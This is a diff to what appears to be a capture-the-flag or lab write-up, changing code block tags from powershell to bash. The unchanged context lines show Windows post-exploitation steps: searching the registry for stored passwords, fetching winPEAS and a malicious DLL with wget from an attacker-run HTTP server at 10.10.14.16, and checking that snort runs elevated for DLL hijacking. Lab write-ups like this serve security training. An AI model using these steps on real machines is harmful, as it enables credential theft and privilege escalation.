@@ -569,7 +569,7 @@ PS C:\inetpub\internal\dashboard\uploads>
 
 Upon exploring the target, there are some things to note down:
 
-```powershell
+```bash
 PS C:\inetpub\internal\dashboard\uploads> dir c:\
 
 
@@ -615,7 +615,7 @@ We can start seaching for locations that might contain interesting info, for exa
 
 > [THM Red Teaming path: Active Directory - Credentials Harvesting](https://tryhackme.com/paths).
 
-```powershell
+```bash
 *Evil-WinRM* PS C:\Users\jdoe\Documents> reg query HKLM /f password /t REG_SZ /s
 
 <SNIP>
@@ -628,7 +628,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 
 Upon closer inspection of this file:
 
-```powershell
+```bash
 PS C:\inetpub\internal\dashboard\uploads> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
@@ -668,7 +668,7 @@ $ python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 ```
 
-```powershell
+```bash
 # download winpeas executable
 *Evil-WinRM* PS C:\Users\jdoe> wget http://10.10.14.16:8888/winPEASx64.exe -o recon.exe
 # run winpeas
@@ -719,7 +719,7 @@ Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 
 In our case `snort` is already up and running:
 
-```powershell
+```bash
 # getting information about the snort process
 *Evil-WinRM* PS C:\Users\jdoe> Get-Process snort
 
@@ -779,7 +779,7 @@ dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll
 
 We can find out if the `snort` process is running with elevated privileges:
 
-```powershell
+```bash
 *Evil-WinRM* PS C:\Users\jdoe> Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated | findstr snort
 snort                                     True
 ```
@@ -800,7 +800,7 @@ $ python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 ```
 
-```powershell
+```bash
 # download the malicious DLL
 *Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor> wget http://10.10.14.16:8000/sf_engine.dll -o sf_engine.dll
 
